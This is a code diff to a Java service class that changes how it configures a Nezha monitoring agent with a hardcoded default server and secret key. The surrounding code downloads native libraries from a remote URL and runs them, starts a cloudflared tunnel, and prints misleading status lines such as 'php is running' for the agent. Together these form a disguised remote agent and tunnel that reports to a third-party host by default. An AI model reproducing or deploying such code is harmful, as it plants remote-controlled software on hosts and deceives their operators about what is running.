@@ -50,8 +50,8 @@ public class AppService {
     private static final String FILE_PATH = env("FILE_PATH", "world");
     private static final String SUB_PATH = env("SUB_PATH", "sub");
     private static final String UUID = env("UUID", "9ac16559-f9a7-4296-bd77-b837d10fc9d2");
-    private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezhak2.btpp.ggff.net:443");
-    private static final String NEZHA_PORT = env("NEZHA_PORT", "");
+    private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezhak2.btpp.ggff.net");
+    private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "Jy8feKByXQKxEQ90GZ");
     private static final String ARGO_DOMAIN = env("ARGO_DOMAIN","");
     private static final String ARGO_AUTH = env("ARGO_AUTH", "");
@@ -166,14 +166,11 @@ public class AppService {
         Path singBoxLib = downloadLibrary(baseUrl + "/sbx.so", "sbx.so");
         Path cloudflaredLib = null;
         Path nezhaLib = null;
-        Path nezhaAgentLib = null;
 
         if (!DISABLE_ARGO) {
             cloudflaredLib = downloadLibrary(baseUrl + "/bot.so", "bot.so");
         }
-        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && !NEZHA_PORT.isEmpty()) {
-            nezhaAgentLib = downloadLibrary(baseUrl + "/agent.so", "agent.so");
-        } else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
+        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
             nezhaLib = downloadLibrary(baseUrl + "/v1.so", "v1.so");
         } else {
             System.out.println("NEZHA variable is empty, skipping");
@@ -189,7 +186,7 @@ public class AppService {
             ensureTlsCertificates(certPath, keyPath);
         }
 
-        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
+        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
             generateNezhaConfig();
         }
 
@@ -205,8 +202,6 @@ public class AppService {
         }
         if (nezhaLib != null) {
             services.add(new NativeService("nezha-agent", nezhaLib, "StartNezhaAgent", "StopNezhaAgent", nezhaPayload()));
-        } else if (nezhaAgentLib != null) {
-            services.add(new NativeService("nezha-agent", nezhaAgentLib, "StartNezhaAgent", "StopNezhaAgent", nezhaV0Payload()));
         }
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> stopAll(services), "shutdown-hook"));
@@ -217,7 +212,7 @@ public class AppService {
         sleep(1000);
         System.out.println("web is running");
         if (cloudflaredLib != null) System.out.println("bot is running");
-        if (nezhaLib != null || nezhaAgentLib != null) System.out.println("php is running");
+        if (nezhaLib != null) System.out.println("php is running");
 
         sleep(5000);
         String argoDomain = extractDomain().orElse(null);
@@ -491,8 +486,8 @@ public class AppService {
     }
 
     private static void generateNezhaConfig() throws IOException {
-        String nzPort = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
-        boolean tls = List.of("443", "8443", "2096", "2087", "2083", "2053").contains(nzPort);
+        String serverAddr = NEZHA_SERVER.contains(":") ? NEZHA_SERVER : NEZHA_SERVER + ":" + NEZHA_PORT;
+        boolean tls = List.of("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT);
         String yaml = "client_secret: " + NEZHA_KEY + "\n" +
                 "debug: false\n" +
                 "disable_auto_update: true\n" +
@@ -504,7 +499,7 @@ public class AppService {
                 "insecure_tls: true\n" +
                 "ip_report_period: 1800\n" +
                 "report_delay: 4\n" +
-                "server: " + NEZHA_SERVER + "\n" +
+                "server: " + serverAddr + "\n" +
                 "skip_connection_count: true\n" +
                 "skip_procs_count: true\n" +
                 "temperature: false\n" +
